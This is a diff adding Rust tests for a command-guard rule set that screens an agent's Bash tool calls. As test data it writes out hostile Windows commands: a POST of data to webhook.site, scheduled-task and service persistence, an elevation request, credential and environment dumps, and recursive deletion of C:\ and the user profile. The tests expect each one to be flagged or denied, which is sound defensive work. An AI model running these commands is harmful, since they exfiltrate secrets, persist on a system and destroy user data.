@@ -517,4 +517,36 @@ mod tests {
             "irm -Uri https://webhook.site/abc -Method POST -Body $x"})));
         assert!(hits.iter().any(|h| h.id == "egress.exfil_host"));
     }
+
+    #[test]
+    fn matches_windows_persistence_and_dumps() {
+        let rs = RuleSet::load().unwrap();
+        let hit = |cmd: &str, id: &str| {
+            rs.matches(&tc("Bash", json!({ "command": cmd })))
+                .iter()
+                .any(|h| h.id == id)
+        };
+        assert!(hit("schtasks /create /tn evil /tr calc.exe", "persist.scheduler"));
+        assert!(hit("New-Service -Name evil -BinaryPathName c:/x.exe", "persist.scheduler"));
+        assert!(hit("Start-Process powershell -Verb RunAs", "persist.sudo"));
+        assert!(hit("Get-ChildItem Env:", "secrets.env_dump"));
+        assert!(hit("findstr /S /I password c:/proj/*", "secrets.grep_hunt"));
+        assert!(hit("cmdkey /list", "secrets.cred_store"));
+    }
+
+    #[test]
+    fn matches_windows_recursive_delete_only_at_dangerous_root() {
+        let rs = RuleSet::load().unwrap();
+        let deny = |cmd: &str| {
+            rs.matches(&tc("Bash", json!({ "command": cmd })))
+                .iter()
+                .any(|h| h.id == "destructive.rm_rf" && h.decision == Decision::Deny)
+        };
+        // Dangerous roots -> deny.
+        assert!(deny(r"rd /s /q C:\"));
+        assert!(deny(r"Remove-Item -Recurse -Force $env:USERPROFILE"));
+        // Scoped project dirs must NOT fire (the whole point of the gating).
+        assert!(!deny(r"Remove-Item -Recurse -Force .\build"));
+        assert!(!deny(r"rd /s /q .\node_modules"));
+    }
 }
